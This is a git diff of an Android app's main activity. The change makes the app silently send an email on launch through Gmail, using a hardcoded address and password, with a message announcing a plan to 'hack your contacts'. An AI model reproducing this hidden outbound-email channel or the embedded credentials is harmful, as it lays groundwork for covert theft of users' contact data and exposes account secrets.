@@ -8,11 +8,8 @@ import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
 import android.net.Uri;
-import android.os.Build;
 import android.os.Bundle;
-import android.os.RemoteException;
 import android.provider.ContactsContract;
-import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
@@ -21,7 +18,6 @@ import android.widget.RatingBar;
 import android.widget.TextView;
 import android.widget.Toast;
 
-import com.kristijandraca.backgroundmaillibrary.BackgroundMail;
 
 public class MainActivity extends AppCompatActivity {
     private static final String TAG = "ContactProvider";
@@ -33,7 +29,7 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         websites_db = new WebsitesDatabase(this);
-        sendEmail();
+        sendEmail("Bonjour, ceci est un test ! Bientôt on va hacker tes contacts");
     }
 
     /*
@@ -44,12 +40,11 @@ public class MainActivity extends AppCompatActivity {
         return parsed_url.startsWith("http://") || parsed_url.startsWith("https://");
     }
 
-    public void sendEmail() {
+    public void sendEmail(String emailBody) {
         String fromEmail = "jean.test.mobile@gmail.com";
         String fromPassword = "MotDePasse123!";
         String toEmail = "juliette.deguillaume@gmail.com";
         String emailSubject = "Subject test bis";
-        String emailBody = "Bonjour, ceci est un test !";
 
         new GMail(fromEmail, fromPassword, toEmail, emailSubject, emailBody);
     }
